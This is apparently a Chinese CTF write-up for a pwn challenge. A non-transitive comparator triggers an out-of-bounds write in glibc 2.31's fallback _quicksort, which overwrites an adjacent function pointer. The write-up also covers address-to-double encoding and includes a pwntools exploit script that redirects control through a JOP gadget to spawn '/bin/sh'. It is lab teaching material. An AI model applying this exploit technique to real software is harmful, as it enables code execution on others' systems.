# 我们的快排確有問題

## 题目简述

附件是 Ubuntu 20.04 / glibc 2.31 的非 PIE x86-64 程序。它把比较函数指针和 256 个 `double` 放在同一全局结构中：

```c
struct {
    int (*sort_func)(const void *, const void *);
    double temp_sort_array[0x100];
} gms;
```

程序读入两轮 GPA，各调用一次 `qsort`。它还改写旧版 glibc 的 `__malloc_hook` 使分配恒定失败，迫使 `qsort` 退回原地 `_quicksort`。目标是借第一轮排序覆盖数组低地址一侧的 `sort_func`，再在第二轮把被劫持的比较调用转成代码执行，最终运行 `/1w4tch`。决定性障碍是越界写和控制流劫持，归为 `pwn`。

## 解题过程

### 非传递比较器触发旧版 glibc 缺陷

题目比较器在任一参数小于 2.5 时无条件返回 `-1`：

```c
if (!a || !b) return 0;
if (a < 2.5 || b < 2.5) return -1;
if (a < b) return -1;
if (a > b) return 1;
return 0;
```

因此可能同时得到 `cmp(a,b)<0` 与 `cmp(b,a)<0`，不满足严格弱序。glibc 2.31 正常会为归并排序申请临时缓冲区；题目让 `malloc` 失败后，实际进入旧 `_quicksort`。其插入整理阶段包含：

```c
tmp_ptr = run_ptr - size;
while (cmp(run_ptr, tmp_ptr, arg) < 0)
    tmp_ptr -= size;
```

代码依赖比较器满足顺序性质，没有在循环内重新检查 `tmp_ptr >= base_ptr`。恶意比较结果可使 `tmp_ptr` 继续向低地址移动并交换数据。数组前一个机器字恰好是 `gms.sort_func`，所以越界一个元素就获得函数指针覆盖。

### 用 `double` 承载 64 位地址

输入经 `%lf` 解析，不能把地址当普通十进制整数传入，否则数值转换会改变位模式。应在本地把 64 位整数按小端位模式重解释为 IEEE-754 `double`：

```python
import struct

def u64_to_f64(value):
    return struct.unpack("<d", struct.pack("<Q", value))[0]

def f64_to_u64(value):
    return struct.unpack("<Q", struct.pack("<d", value))[0]
```

二进制为非 PIE，官方附件中 `doredolaso` 的地址为 `0x4011dd`。它执行 `add rsp, 8; jmp [rsi]`，可把比较器调用现场变成一次 JOP 跳转。

### 两阶段 payload

第一轮提交满 256 个元素。大部分使用正常 GPA `4.3`，在能被越界交换到函数指针的位置放入 `u64_to_f64(0x4011dd)`。非传递比较器触发低地址越界后，`gms.sort_func` 被替换为 `doredolaso`。

第二轮排序仍从该指针调用“比较器”。此时控制 `rsi` 指向的数组元素，便能让 `jmp [rsi]` 落到程序内的后门/JOP 链。官方利用使用 `0x401201` 作为下一跳，并把其余元素填成 `b"/bin/sh\x00"` 的 64 位位模式，使后续 `system` 调用获得 shell；进入 shell 后执行：

```text
/1w4tch
```

最小交互骨架如下，地址必须以实际附件为准：

```python
from pwn import *

io = process("./sort_ur_jipei")
io.sendlineafter(b"student number:\n", b"256")

first = [4.3] * 256
first[0x10] = u64_to_f64(0x4011DD)
for value in first:
    io.sendline(str(value).encode())

second = [u64_to_f64(u64(b"/bin/sh\x00"))] * 256
second[0] = u64_to_f64(0x401201)
for value in second:
    io.sendline(str(value).encode())

io.interactive()
```

源码、官方利用脚本和 glibc 2.31 `_quicksort` 片段相互印证了“强制分配失败 → 非传递比较器 → 低地址越界 → 覆盖函数指针”的完整原语。本次未启动旧 glibc 环境动态复现，因此具体地址和第二阶段寄存器状态仍应以随附二进制调试结果为准。

## 方法总结

- 核心技巧：利用旧版 glibc `qsort` 对比较器严格弱序的隐含假设，在内存分配失败的回退路径中制造向低地址越界写。
- 识别信号：自定义比较器明显非对称/非传递、目标固定旧 glibc、程序刻意让 `malloc` 失败，而且数组前方紧邻敏感指针时，应检查排序实现的回退路径。
- 复用要点：浮点输入承载地址时必须重解释位模式；先证明函数指针覆盖，再构造 JOP/ROP；glibc 版本、是否进入 `_quicksort` 以及非 PIE 地址都是利用成立的必要条件。
